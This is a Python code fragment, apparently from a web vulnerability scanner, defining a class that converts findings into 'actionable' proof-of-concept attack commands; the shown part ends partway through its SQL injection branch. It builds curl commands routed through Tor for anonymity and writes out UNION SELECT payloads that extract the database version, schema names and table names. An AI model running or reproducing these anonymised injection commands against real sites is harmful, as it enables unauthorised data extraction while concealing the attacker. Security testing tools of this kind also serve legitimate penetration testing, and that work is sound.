class PoCExporter:
    """Export exploitable findings as actionable PoC commands.

    All exports are OPSEC-safe by default:
    - Cookies, auth headers, API keys redacted
    - All commands route through Tor (--socks5-hostname)
    - No real target identifiers in filenames
    """

    @staticmethod
    def export_finding(finding: dict, redact: bool = True) -> dict:
        """Export a finding as actionable PoC with REAL URLs from the finding."""
        ei = finding.get("exploit_info", {})
        exploit_type = ei.get("type", "unknown")
        param = ei.get("parameter", "")
        path = ei.get("path", "")
        sp = f"--socks5-hostname 127.0.0.1:{_ACTIVE_TOR_PORT}"

        # Use the actual test_url from the finding when available
        target = finding.get("test_url", "[TARGET]")
        if target == "[TARGET]" and path:
            target = f"[TARGET]{path}"

        poc = {
            "finding": finding.get("title", ""),
            "severity": finding.get("severity", ""),
            "confidence": finding.get("confidence", 0),
            "verified": finding.get("verified", "unverified"),
            "curl": "",
            "steps": [],
            "description": "",
            "remediation": "",
            "impact": "",
        }

        if exploit_type == "sqli" and param:
            poc["curl"] = f'curl {sp} "{target}"'
            poc["steps"] = [
                f"# 1. Confirm injection:",
                f"curl {sp} \"{target}\"",
                f"# 2. Extract database version:",
                f"curl {sp} \"{target.split('?')[0]}?{param}=' UNION SELECT version()-- -\"" if "?" in target else f"# Modify {param} parameter with UNION SELECT version()-- -",
                f"# 3. List databases:",
                f"#    Payload: ' UNION SELECT schema_name FROM information_schema.schemata-- -",
                f"# 4. Extract tables:",
                f"#    Payload: ' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()-- -",
